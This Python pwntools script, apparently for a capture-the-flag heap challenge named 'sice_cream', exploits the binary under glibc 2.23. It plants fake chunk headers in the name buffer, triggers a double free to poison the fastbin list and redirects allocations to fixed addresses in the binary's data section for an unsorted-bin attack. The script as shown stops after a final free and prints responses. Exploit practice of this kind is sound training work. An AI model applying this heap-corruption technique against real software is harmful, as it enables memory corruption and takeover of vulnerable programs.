import sys, time, re
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

BIN = './sice_cream'
NAME = 0x602040
FASTBIN_FAKE = 0x602130
UNSORTED_FAKE = 0x602050

p = process(['./ld-2.23.so', '--library-path', '.', BIN], stderr=process.STDOUT)


def buy(size, data):
    p.recvuntil(b'> ')
    p.send(b'1\n')
    p.recvuntil(b'> ')
    p.send(str(size).encode() + b'\n')
    p.recvuntil(b'> ')
    p.send(data)
    p.recvuntil(b'Here you go!')


def eat_raw(idx):
    p.recvuntil(b'> ')
    p.send(b'2\n')
    p.recvuntil(b'> ')
    p.send(str(idx).encode() + b'\n')
    time.sleep(0.4)
    try:
        return p.recvrepeat(0.4)
    except Exception as e:
        return b'ERR ' + str(e).encode()


buf = bytearray(b'A' * 0x100)
buf[0x18:0x20] = p64(0x91)
buf[0xa0:0xa8] = p64(0)
buf[0xa8:0xb0] = p64(0x21)
buf[0xc0:0xc8] = p64(0)
buf[0xc8:0xd0] = p64(0x21)
buf[0xf0:0xf8] = p64(0)
buf[0xf8:0x100] = p64(0x60)

p.recvuntil(b'Whats your name?')
p.recvuntil(b'> ')
p.send(bytes(buf))

buy(0x58, b'A' * 0x58)
buy(0x58, b'B' * 0x58)
print("eat0:", eat_raw(0)[:120])
print("eat1:", eat_raw(1)[:120])
print("eat0:", eat_raw(0)[:120])
buy(0x58, p64(FASTBIN_FAKE) + b'C' * (0x58 - 8))
buy(0x58, b'D' * 0x58)
buy(0x58, b'E' * 0x58)
buy(0x58, p64(UNSORTED_FAKE) + p64(0) * 10)
print("-> maintenant free(creams[0])")
r = eat_raw(0)
print("reponse eat:", r[:300])
time.sleep(0.3)
print("sortie finale:", p.recvrepeat(0.5)[:300])
try:
    p.close()
except Exception:
    pass
